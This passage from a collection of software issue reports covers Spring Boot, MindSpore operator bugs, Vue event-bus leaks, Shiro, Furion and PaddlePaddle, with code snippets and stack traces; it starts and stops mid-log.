org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:81) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:122) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:116) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:126) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:81) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:109) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilterInternal(BasicAuthenticationFilter.java:181) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.16.jar:5.3.16] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:219) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:213) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.16.jar:5.3.16] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.16.jar:5.3.16] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:211) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:183) [spring-security-web-5.6.2.jar:5.6.2] at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:354) [spring-web-5.3.16.jar:5.3.16] at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:267) [spring-web-5.3.16.jar:5.3.16] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) [spring-web-5.3.16.jar:5.3.16] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.16.jar:5.3.16] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) [spring-web-5.3.16.jar:5.3.16] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.16.jar:5.3.16] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96) [spring-boot-actuator-2.6.4.jar:2.6.4] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.16.jar:5.3.16] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.3.16.jar:5.3.16] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.16.jar:5.3.16] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.2.16.Final.jar:2.2.16.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) [undertow-core-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) [undertow-core-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) [undertow-core-2.2.16.Final.jar:2.2.16.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:275) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:255) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387) [undertow-core-2.2.16.Final.jar:2.2.16.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852) [undertow-core-2.2.16.Final.jar:2.2.16.Final] at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280) [xnio-api-3.8.6.Final.jar:3.8.6.Final] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291] Caused by: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Cannot construct instance of `de.codecentric.boot.admin.server.domain.values.Registration` (no Creators, like default constructor, exist): cannot deserialize from Object value (no delegate- or property-based Creator) at [Source: (org.springframework.util.StreamUtils$NonClosingInputStream); line: 1, column: 2] at com.fasterxml.jackson.databind.exc.InvalidDefinitionException.from(InvalidDefinitionException.java:67) ~[jackson-databind-2.13.1.jar:2.13.1] at com.fasterxml.jackson.databind.DeserializationContext.reportBadDefinition(DeserializationContext.java:1904) ~[jackson-databind-2.13.1.jar:2.13.1] at com.fasterxml.jackson.databind.DatabindContext.reportBadDefinition(DatabindContext.java:400) ~[jackson-databind-2.13.1.jar:2.13.1] at com.fasterxml.jackson.databind.DeserializationContext.handleMissingInstantiator(DeserializationContext.java:1349) ~[jackson-databind-2.13.1.jar:2.13.1] at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.deserializeFromObjectUsingNonDefault(BeanDeserializerBase.java:1415) ~[jackson-databind-2.13.1.jar:2.13.1] at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserializeFromObject(BeanDeserializer.java:351) ~[jackson-databind-2.13.1.jar:2.13.1] at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:184) ~[jackson-databind-2.13.1.jar:2.13.1] at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:322) ~[jackson-databind-2.13.1.jar:2.13.1] at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4674) ~[jackson-databind-2.13.1.jar:2.13.1] at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3682) ~[jackson-databind-2.13.1.jar:2.13.1] at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.readJavaType(AbstractJackson2HttpMessageConverter.java:380) ~[spring-web-5.3.16.jar:5.3.16] ... 113 common frames omitted"
事件名都注册为'submitRefresh'，未卸载的组件的同一事件名的处理程序被执行,"切换页面时，由于onUnmount不能及时执行并关闭注册事件，导致当前页面触发'submitRefresh'事件时，所有采用这个事件名的其他组件的处理程序也会被触发执行。 第一个组件： 第二个组件： ...... 切换到不同的页面时，原来组件并没有及时执行'onUnmount'事件处理程序，导致一个页面的组件触发了'submitRefresh'事件，这个事件处理程序会被执行多次。 下面是chrome conolse log：   <code>: mittBus.on('submitRefresh', () =&gt; { console.log('driver refresh'); handleQuery(); }); mittBus.on('submitRefresh', () =&gt; { console.log('vehicle refresh'); handleQuery(); }); driver refresh supplier refresh vehicle kind refresh vehicle refresh"
[CT][MS][OCCM][AICPU-Lgamma]lgamma operator dynamic rank test cases have AssertionError with dtype float64 on CPU,"dynamic rank test cases have AssertionError with dtype float64 on CPU。 / 硬件环境: /device CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_dynamic_rank_lgamma_4d_float64 ef test_dynamic_rank_lgamma_4d_float64(): x = np.random.randn(8, 16, 32, 128).astype(np.float64) input_x = Tensor(x) indices = Tensor(np.unique(np.random.randint(0, 2, size=6).astype(np.int64))) fact = LgammaDynamicRankMock(inputs=[input_x, indices]) ../dynamic_shape_operations/test_dynamic_shape_lgamma.py:95: ../dynamic_shape_operations/test_dynamic_shape_lgamma.py:61: in forward_dynamic_rank_cmp allclose_nparray(out_pt, out_ms, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) data_expected = array([[ -6.92208442, -3.26362518, 9.32611189, ..., -7.46091312, 11.47680503, -0.09491261], [-27....5.28426973], [ -0.11636228, -0.56679555, 29.4094299 , ..., -1.27819357, 54.60270014, -5.61163567]]) data_me = array([[ -6.92208242, -3.26362419, 9.32611179, ..., -7.46091318, 11.47680473, -0.0949126 ], [-27....5.28427029], [ -0.11636226, -0.56679505, 29.40943146, ..., -1.27819371, 54.60269928, -5.61163521]]) rtol = 1e-05, atol = 1e-05 E AssertionError: E data_expected_std:[ -5.30170318 -38.5908151 -0.56106076 4.91663775 1.51453895 E 0.78182126 -40.80607131 -1.61301685 0.16115366 1.81926173 E -6.05148489 -1.74746469] E data_me_error:[ -5.30142927 -38.59037781 -0.56104261 4.91654539 1.51460636 E 0.7818597 -40.80525208 -1.61304796 0.16103299 1.81929243 E -6.05138969 -1.74743688] E loss:[2.73903426e-04 4.37296994e-04 1.81556232e-05 9.23611640e-05 E 6.74043658e-05 3.84330534e-05 8.19235807e-04 3.11056299e-05 E 1.20668794e-04 3.07000251e-05 9.51938719e-05 2.78076478e-05] ../share/utils.py:24: AssertionError pass   <code>: fact.forward_dynamic_rank_cmp() def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ format(data_expected[greater], data_me[greater], error[greater])"
【MS】mindspore 1.9版本ops.DepthToSpace算子执行报错,"ops.DepthToSpace()单算子运行报错！！！ 报错如下： 代码如下：   <code>: import mindspore as ms import mindspore.nn as nn import mindspore.ops as ops class TestNet(nn.Cell): """"""Structure of SubpixelConvolutionLayer"""""" def __init__(self, block_size): super(TestNet, self).__init__() self.pixel_shuffle = ops.DepthToSpace(block_size) def construct(self, x): out = self.pixel_shuffle(x) return out ms.context.set_context(mode=ms.context.GRAPH_MODE, device_id=0) net = TestNet(block_size=2) x = ms.numpy.rand((1, 12, 1, 1)) net(x)"
ops.svd raise runtime error,"Calling multiple times together with and raise RuntimeError. Calling single time is OK. / 硬件环境: /device GPU : -- MindSpore version : 1.9.0 -- Python version : 3.7.13 -- OS platform and distribution : 18.04.6 -- GCC/Compiler version : (/): /mode pynative /mode graph Run the above code snippet. Expect no error.   <code>: ops.svd ops.reshape ops.transpose import numpy as np import mindspore as ms import mindspore.ops as ops import mindspore.nn as nn class Network(nn.Cell): def __init__(self): super().__init__() def construct(self, x): x = ops.reshape(x, (x.shape[0], -1)) x = ops.transpose(x, (1, 0)) _, _, V = ops.svd(x, full_matrices=True) return V def main(): net = Network() for _ in range(2): x = ms.Tensor(np.random.random(size=(10, 12, 20))) net(x) if __name__ == '__main__': main() RuntimeError: cusolver Error: cusolver svd fail | Error Number: 7 ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/plugin/device/gpu/kernel/math/svd_gpu_kernel.cc:169 RunSvd [ERROR] DEVICE(16850,7f8eb270e100,python):2022-11-22-08:49:33.176.651 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:173] SyncStream] cudaStreamSynchronize failed, ret[700], an illegal memory access was encountered [ERROR] ME(16850,7f8eb270e100,python):2022-11-22-08:49:33.176.698 [mindspore/ccsrc/runtime/hardware/device_context_manager.cc:231] WaitTaskFinishOnDevice] SyncStream failed [ERROR] DEVICE(16850,7f8eb270e100,python):2022-11-22-08:49:33.195.635 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:164] DestroyStream] cudaStreamDestroy failed, ret[700], an illegal memory access was encountered [ERROR] DEVICE(16850,7f8eb270e100,python):2022-11-22-08:49:33.195.672 [mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_device_manager.cc:67] ReleaseDevice] Op Error: Failed to destroy CUDA stream. | Error Number: 0 [ERROR] DEVICE(16850,7f8eb270e100,python):2022-11-22-08:49:33.196.243 [mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_device_manager.cc:74] ReleaseDevice] cuDNN Error: Failed to destroy cuDNN handle | Error Number: 4 CUDNN_STATUS_INTERNAL_ERROR [ERROR] DEVICE(16850,7f8eb270e100,python):2022-11-22-08:49:33.197.356 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:54] FreeDeviceMem] cudaFree failed, ret[700], an illegal memory access was encountered Error in atexit._run_exitfuncs: RuntimeError: Free device memory[0x7f8cdc000000] error. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:434 operator()"
【众智】【计算-AICPU接入】Nanquantile,"Nanquantile Tasks AICPU算子适配 + functional接口 + CPU算子迁移 -&gt; 只需要 functional接口，底层与Quantile共用 Introduction 沿着dim维度求行的第q分位数, 忽略Nan。 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 算子原语 (与Quantile共用） 参考：https://e.gitee.com/mind_spore/projects/204387/requirements/table?issue=I4XJFV 对标接口参考 PyTorch1.8.1接口： torch.nanquantile https://pytorch.org/docs/stable/generated/torch.nanquantile.html 3. 异常处理 4. 算子反向 无反向   <code>: def nanquantile(input:tensor, q:Union[float,tensor], dim:int=None, keep_dims:bool=False) → Tensor # ignore_nan = True return out"
ShiroUtils.getSysUser()获取用户数据错乱,Linux环境下操作用户为A，使用获取出的用户却为B，其他环境正常。（代码为异步执行） 会不会是这个问题引发的：线程池shiro获取当前user出错问题   <code>: ShiroUtils.getSysUser()
【MindStudio提出】mindspore.ops.MaxPool3D在ceil_mode=True时计算结果不一致,"mindspore 1.9.0 mindspore.ops.MaxPool3D在ceil_mode=True时计算结果出现问题 / 硬件环境: GPU : -- MindSpore version : 1.8.1 1.9.0 -- Python version : 3.7.5 -- OS platform and distribution : Ubuntu 18.04.5 LTS (/): /mode pynative /mode graph 分别在1.8.1和1.9.0上运行 1.8.1 mindspore version: 1.8.1 input shape: (4, 3, 6, 6, 5) res shape: (4, 3, 3, 3, 2) no ceil res shape: (4, 3, 2, 2, 2) 1.9.0 mindspore version: 1.9.0 input shape: (4, 3, 6, 6, 5) res shape: (4, 3, 2, 2, 2) no ceil res shape: (4, 3, 2, 2, 2)   <code>: import mindspore as ms import numpy as np print(f""mindspore version: {ms.__version__}"") a = ms.Tensor(np.random.randn(4, 3, 6, 6, 5), ms.float32) print(f""input shape: {a.shape}"") maxpool = ms.ops.MaxPool3D(kernel_size=3, strides=2, pad_mode=""pad"", pad_list=0, ceil_mode=True) res = maxpool(a) print(f""res shape: {res.shape}"") maxpool = ms.ops.MaxPool3D(kernel_size=3, strides=2, pad_mode=""pad"", pad_list=0, ceil_mode=False) res = maxpool(a) print(f""no ceil res shape: {res.shape}"")"
【错误】事件总线无法正常执行，我觉得很严重....,"Furion 版本号 2.19.2 Web 项目类型 WebApi 事件总线无法正常执行 经调试错误发生在 Furion.EventBridge.EventDispatcher.InvokeAsync 方法， 其中的 var parameters = new List { ConvertGenericPayload(eventPayload, method) } 执行遇到错误 在EventDispatcher.cs的 83行 补充图片   <code>: Constructor on type 'Furion.EventBridge.EventMessage`1[[System.String, System.Private.CoreLib, Version=5.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]' not found. await Event.EmitAsync(""tcp:dispose"", 123456); [EventHandler(""tcp"")] public class TcpEventHandler : IEventHandler { // 仓储注入 private readonly IRepository&lt;TcpServerInfo&gt; _rep; public TcpEventHandler(IRepository&lt;TcpServerInfo&gt; rep) { _rep = rep; } [EventMessage(""dispose"")] public void DisposeServer(EventMessage&lt;long&gt; eventMessage) { // .... 省略业务 } }"
add v2-layer,"Before this new package , users would need to use functions in to configure networks. The Old Way This old way requires that the creation of a network be defined in a Python function, say , and that this Python function being passed to for the creation of protobuf message description of this network. When executes , those layer definition functions like and would change some Python global variables, so that after the execution, could collect information from these global variables and generates the protobuf message. The New Way In this PR, we define a function in which creates a Python class for each layer creation function in . Users can use create a network as follows: This new way doesn't require those invocations to layer definition functions to be in a Python function but could be anywhere. Also, the creation of a protobuf message is hidden in the invocation of , no longer exposed to users.   <code>: paddle.v2.layer paddle.trainer_config_helpers.layers network_config paddle.trainer_config_helpers.parse_network_config def network_config(): img = paddle.trainer_config_helpers.data_layer(name=""pixel"", size=784) inference = paddle.trainer_config_helpers.fc_layer( input=img, size=10, act=paddle.trainer_config_helpers.SoftmaxActivation()) cost = paddle.trainer_config_helpers.classification_cost( input=inference, label=paddle.trainer_config_helpers.data_layer(name=""label"", size=10)) proto_desc = parse_network_config(network_config) parse_network_config network_config data_layer fc_layer parse_network_config paddle.v2.layer paddle.trainer_config_helpers.layers img = paddle.v2.layer.data(name=""pixel"", size=784) inference = paddle.v2.layer.fc(input=img, size=10, act=paddle.v2.layer.Softmax()) cost = paddle.v2.layer.classification( input=inference, label=paddle.v2.layer.data(name=""label"", size=10)) parameters = paddle.v2.parameters.create(cost) paddle.v2.parameters.create"
所有 Mapper.java 类加上注解@Mapper后，本模块依然无法启动的问题,环境信息 pigx版本: 3.7 是否修改包名: 是 根据版本升级#734:请问下pigx的商业版用的avue版本是多少呢?的说明已经为所有Mapper.java 加上了注解@Mapper，但依然有问题 错误日志：   <code>: 2020-03-12 19:15:37.047 WARN 12748 --- [ main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'evapIarcMachineAgriculturalCooperativesController' defined in file [E:\IdeaProjects\evap\evap-iarcfile\target\classes\com\ctmi\evap\iarcfile\controller\EvapIarcMachineAgriculturalCooperativesController.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'evapIarcMachineAgriculturalCooperativesServiceImpl': Unsatisfied dependency expressed through field 'baseMapper'; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.ctmi.evap.iarcfile.mapper.EvapIarcMachineAgriculturalCooperativesMapper' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)} 2020-03-12 19:15:37.048 INFO 12748 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closing ... 2020-03-12 19:15:37.049 INFO 12748 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closed 2020-03-12 19:15:37.196 INFO 12748 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2020-03-12 19:15:37.647 ERROR 12748 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'evapIarcMachineAgriculturalCooperativesController' defined in file [E:\IdeaProjects\evap\evap-iarcfile\target\classes\com\ctmi\evap\iarcfile\controller\EvapIarcMachineAgriculturalCooperativesController.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'evapIarcMachineAgriculturalCooperativesServiceImpl': Unsatisfied dependency expressed through field 'baseMapper'; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.ctmi.evap.iarcfile.mapper.EvapIarcMachineAgriculturalCooperativesMapper' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)} at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:798) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:228) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1358) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:557) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:879) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:878) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) at 